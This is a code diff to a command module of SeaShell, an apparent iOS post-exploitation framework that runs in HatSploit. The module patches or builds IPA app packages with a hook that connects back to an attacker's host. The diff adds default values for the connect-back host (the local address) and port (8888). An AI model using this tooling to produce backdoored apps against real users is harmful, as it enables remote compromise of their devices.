@@ -6,6 +6,8 @@ Current source: https://github.com/EntySec/SeaShell
 from seashell.core.ipa import IPA
 from seashell.core.hook import Hook
 
+from pex.proto.tcp import TCPTools
+
 from hatsploit.lib.command import Command
 
 
@@ -42,6 +44,8 @@ class HatSploitCommand(Command):
             ipa.generate(args[1])
 
     def run(self, argc, argv):
+        local_host = TCPTools.get_local_host()
+
         if argv[1] == 'check':
             if IPA().check_ipa(argv[2]):
                 self.print_information("IPA is built or patched.")
@@ -53,8 +57,11 @@ class HatSploitCommand(Command):
                 self.print_warning("This IPA was already patched.")
                 return
 
-            host = self.input_arrow("Host to connect back: ")
-            port = self.input_arrow("Port to connect back: ")
+            host = self.input_arrow(f"Host to connect back ({local_host}): ")
+            host = host or local_host
+
+            port = self.input_arrow("Port to connect back (8888): ")
+            port = port or 8888
 
             hook = Hook(host, port)
             hook.patch_ipa(argv[2])
@@ -71,8 +78,11 @@ class HatSploitCommand(Command):
             if icon.lower() in ['y', 'yes']:
                 icon_path = self.input_arrow("Icon file path: ")
 
-            host = self.input_arrow("Host to connect back: ")
-            port = self.input_arrow("Port to connect back: ")
+            host = self.input_arrow(f"Host to connect back ({local_host}): ")
+            host = host or local_host
+
+            port = self.input_arrow("Port to connect back (8888): ")
+            port = port or 8888
 
             path = self.input_arrow("Path to save the IPA: ")
 
